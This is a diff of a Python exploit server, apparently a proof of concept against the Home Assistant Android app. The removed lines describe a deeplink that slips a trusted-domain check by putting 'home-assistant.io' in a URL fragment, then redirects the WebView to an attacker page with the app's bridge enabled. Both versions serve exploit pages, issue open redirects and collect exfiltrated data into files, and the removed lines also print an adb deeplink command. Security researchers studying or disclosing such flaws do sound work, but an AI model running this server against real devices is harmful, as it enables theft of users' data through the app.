@@ -1,123 +1,83 @@
-"""
-2.2.2 Insecure Redirect Handling - EXP Server
-Vulnerability: isTrustedUrl passes, then official server 302 redirects
-to attacker page. shouldOverrideUrlLoading doesn't block untrusted redirects.
-
-Flow:
-1. Deeplink: homeassistant://webview?url=http://host:8000/oauth/callback%23home-assistant.io
-2. URL passes isTrustedUrl (contains "home-assistant.io" in fragment)
-3. /oauth/callback returns 302 redirect to /exp/2.2.2.html
-4. WebView follows redirect without URL re-validation
-5. Attacker page loads with ExternalApp bridge enabled
-"""
-
-import http.server
-import json
-import urllib.parse
-import os
+﻿#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import http.server, json, urllib.parse, os, socket, time
 
 PORT = 8000
-COLLECT_DIR = os.path.join(os.path.dirname(__file__), "received")
-os.makedirs(COLLECT_DIR, exist_ok=True)
+EXP_DIR = os.path.join(os.path.dirname(__file__), "exp")
+OUT_DIR = os.path.join(os.path.dirname(__file__), "received")
+os.makedirs(OUT_DIR, exist_ok=True)
 
+def get_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
 
-class ExploitHandler(http.server.SimpleHTTPRequestHandler):
+LOCAL_IP = get_ip()
+SAMPLE = os.path.basename(os.path.dirname(__file__))
+
+class H(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        parsed = urllib.parse.urlparse(self.path)
-
-        # Simulate official OAuth callback that redirects to attacker
-        if parsed.path == "/oauth/callback":
+        p = urllib.parse.urlparse(self.path)
+        if p.path == "/collect":
+            q = urllib.parse.parse_qs(p.query); d = q.get("d",[""])[0]
+            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
+            if d:
+                ts = str(int(time.time()*1000))
+                with open(os.path.join(OUT_DIR, f"collected_{ts}.txt"),"w",encoding="utf-8") as f:
+                    f.write(urllib.parse.unquote(d))
+                print(f"[+] {d[:100]}")
+            self.wfile.write(b"ok"); return
+        if p.path.startswith("/exp/"):
+            fn = os.path.basename(p.path) or "index.html"
+            if not fn.endswith(".html"): fn += ".html"
+            fp = os.path.join(EXP_DIR, fn)
+            if os.path.exists(fp):
+                self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
+                with open(fp,"r",encoding="utf-8") as f:
+                    self.wfile.write(f.read().replace("{{LOCAL_IP}}", LOCAL_IP).encode("utf-8"))
+            else:
+                self.send_response(404); self.end_headers(); self.wfile.write(b"exp not found")
+            return
+        # OAuth redirect endpoint (official server simulation)
+        if p.path.startswith("/oauth/callback"):
             redirect_url = "/exp/2.2.2.html"
-            print(f"[+] 302 Redirect: {parsed.path} -> {redirect_url}")
+            print(f"[*] 302 redirect: {p.path} -> {redirect_url}")
             self.send_response(302)
             self.send_header("Location", redirect_url)
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
             return
-
-        # Serve exploit pages
-        if parsed.path.startswith("/exp/"):
-            exp_dir = os.path.join(os.path.dirname(__file__), "exp")
-            file_path = os.path.join(exp_dir, os.path.basename(parsed.path))
-            if os.path.exists(file_path):
-                self.send_response(200)
-                self.send_header("Content-Type", "text/html; charset=utf-8")
-                self.send_header("Access-Control-Allow-Origin", "*")
-                self.end_headers()
-                with open(file_path, "rb") as f:
-                    self.wfile.write(f.read())
-                return
-            else:
-                self.send_error(404)
-                return
-
-        # Data collection endpoint
-        if parsed.path == "/collect":
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
+        # Help center jump redirect
+        if p.path.startswith("/jump"):
+            q = urllib.parse.parse_qs(p.query)
+            target = q.get("target", ["/exp/2.2.2.html"])[0]
+            print(f"[*] 302 jump: {p.path} -> {target}")
+            self.send_response(302)
+            self.send_header("Location", target)
             self.send_header("Access-Control-Allow-Origin", "*")
             self.end_headers()
-
-            query = urllib.parse.parse_qs(parsed.query)
-            timestamp = query.get("t", [str(int(os.times().elapsed * 1000))])[0]
-            data = query.get("d", [""])[0]
-
-            filename = f"collected_{timestamp}.txt"
-            filepath = os.path.join(COLLECT_DIR, filename)
-            with open(filepath, "w", encoding="utf-8") as f:
-                f.write(data)
-
-            print(f"[+] Data collected: {filename} -> {data[:100]}")
-            self.wfile.write(json.dumps({"status": "ok"}).encode())
             return
-
-        # Default: serve files from current directory
-        super().do_GET()
-
+        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
+        self.wfile.write(f"<h2>{SAMPLE}</h2><p>IP:{LOCAL_IP}</p><a href='/exp/1'>exp</a>".encode())
     def do_POST(self):
-        content_length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(content_length) if content_length > 0 else b""
-
-        if self.path == "/collect":
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Access-Control-Allow-Origin", "*")
-            self.end_headers()
-
-            timestamp = str(int(os.times().elapsed * 1000))
-            filename = f"collected_{timestamp}.txt"
-            filepath = os.path.join(COLLECT_DIR, filename)
-            with open(filepath, "wb") as f:
-                f.write(body)
-
-            print(f"[+] Data collected (POST): {filename} -> {body[:100]}")
-            self.wfile.write(json.dumps({"status": "ok"}).encode())
-            return
-
+        cl = int(self.headers.get("Content-Length",0)); body = self.rfile.read(cl) if cl>0 else b""
+        if self.path=="/collect":
+            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
+            with open(os.path.join(OUT_DIR, f"collected_{int(time.time()*1000)}.txt"),"wb") as f: f.write(body)
+            print(f"[+] POST:{body[:100]}"); self.wfile.write(b"ok"); return
         self.send_error(405)
-
     def do_OPTIONS(self):
-        self.send_response(200)
-        self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
-        self.send_header("Access-Control-Allow-Headers", "*")
-        self.end_headers()
-
-    def log_message(self, format, *args):
-        print(f"[{self.client_address[0]}] {format % args}")
-
+        self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS"); self.send_header("Access-Control-Allow-Headers","*"); self.end_headers()
+    def log_message(self, fmt, *args): print(f"[{args[0]}]")
 
 if __name__ == "__main__":
-    print(f"[*] 2.2.2 EXP server starting on port {PORT}")
-    print(f"[*] Official OAuth redirect: http://localhost:{PORT}/oauth/callback")
-    print(f"[*] Exploit page: http://localhost:{PORT}/exp/2.2.2.html")
-    print(f"[*] Deeplink: adb shell am start -a android.intent.action.VIEW -d 'homeassistant://webview?url=http://10.0.2.2:{PORT}/oauth/callback%23home-assistant.io'")
-    print(f"[*] Collect dir: {COLLECT_DIR}")
-    print()
-
-    server = http.server.HTTPServer(("0.0.0.0", PORT), ExploitHandler)
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\n[*] Shutting down...")
-        server.shutdown()
+    print(f"[*] {SAMPLE} on :{PORT}")
+    print(f"[*] IP: {LOCAL_IP}")
+    s = http.server.HTTPServer(("0.0.0.0", PORT), H)
+    try: s.serve_forever()
+    except KeyboardInterrupt: print("\n[*] Done"); s.shutdown()
